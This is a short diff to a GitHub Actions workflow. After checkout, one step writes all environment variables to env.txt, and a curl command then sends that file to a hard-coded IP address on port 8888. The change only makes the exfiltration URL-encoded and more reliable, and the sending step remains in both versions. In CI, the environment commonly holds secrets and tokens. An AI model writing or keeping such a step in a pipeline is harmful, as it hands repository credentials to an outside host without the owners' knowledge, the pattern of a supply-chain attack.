@@ -7,4 +7,4 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - run: env > env.txt
-             curl "http://172.16.254.129:8888/?data=$(cat env.txt)"
+             curl --get "http://172.16.254.129:8888/" --data-urlencode "data=$(cat env.txt)"
